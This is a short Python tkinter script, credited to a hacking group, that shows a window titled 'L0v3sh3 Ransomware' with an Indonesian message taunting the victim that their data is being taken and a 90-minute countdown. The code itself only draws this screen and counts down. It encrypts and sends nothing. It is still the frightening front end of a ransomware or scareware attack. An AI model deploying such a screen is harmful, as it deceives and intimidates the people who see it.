# "Create By KangSantuy"
# "Github e52x"
# "101010"
# "BLACKXPOLIT IDXP"
# " TEAM IDXP "
import tkinter as tk

def countdown(count):


    hour, minute, second = count.split(':')
    hour = int(hour)
    minute = int(minute)
    second = int(second)

    label['text'] = '{}:{}:{}'.format(hour, minute, second)

    if second > 0 or minute > 0 or hour > 0:

        if second > 0:
            second -= 1
        elif minute > 0:
            minute -= 1
            second = 59
        elif hour > 0:
            hour -= 1
            minute = 59
            second = 59
        root.after(1000, countdown, '{}:{}:{}'.format(hour, minute, second)) 

root = tk.Tk()
root.title('L0v3sh3 Ransomware')
root.geometry('500x300')
root.resizable(False, False)
label1 = tk.Label(root, text='WKWKWW ANDA TERALALU TOLOL DATA ANDA SEDANG SAYA AMBIL Hacked By BlackXploit IDXP !!\n\n', font=('calibri', 12,'bold'))
label1.pack()
label = tk.Label(root,font=('calibri', 50,'bold'), fg='white', bg='blue')
label.pack()


countdown('01:30:00')

root.mainloop()
